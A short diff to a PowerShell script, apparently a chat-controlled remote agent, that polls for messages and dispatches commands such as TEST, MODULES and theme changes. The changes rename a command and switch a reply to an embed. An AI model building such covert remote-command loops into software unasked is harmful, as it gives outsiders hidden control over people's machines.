@@ -1149,8 +1149,9 @@ function List_Modules {
         $msg += "`n"
     }
     
-    sendMsg -Message $msg
+    sendEmbedWithImage -Title "Available Modules" -Description $msg
 }
+
 
 function Find_CommandInRegistry {
     param([string]$Command)
@@ -1643,7 +1644,7 @@ while ($true) {
         $parsed = Parse_CommandWithParameters -FullCommand $latestMessage
         $command = $parsed.Command.ToUpper()
         $parameters = $parsed.Parameters
-        sendMsg -Message $command
+        
         switch ($command) {
             'TEST' { sendMsg -Message "Test successful from $env:COMPUTERNAME" }
             #Apply to individual commands
@@ -1655,7 +1656,7 @@ while ($true) {
                 }
             }
             #Technically the same as COMMANDS hence COMMANDS is gone
-            'COMMANDS' { List_Modules }
+            'MODULES' { List_Modules }
             #THEMES
             'GETTHEME' { GetCurrentTheme }
             'ENABLETHEME' { EnableTheme }
@@ -1753,5 +1754,3 @@ while ($true) {
     }
     Start-Sleep -Seconds 3
 }
-
-
